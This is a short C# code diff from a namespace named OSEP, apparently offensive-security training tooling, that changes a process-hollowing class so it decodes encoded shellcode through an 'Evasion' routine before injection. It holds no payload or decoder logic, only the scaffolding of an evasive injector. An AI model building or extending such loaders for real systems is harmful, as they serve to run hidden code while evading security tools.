@@ -15,7 +15,15 @@ namespace OSEP
         public CreateHollowProcess(string process, byte[] shellcode)
         {
             _procPath = process;
-            _shellcode = shellcode;
+
+            if (CONFIG.ENCODED)
+            {
+                _shellcode = Evasion.Decode(shellcode);
+            }
+            else
+            {
+                _shellcode = shellcode;
+            }
         }
 
         public void StartProcess()
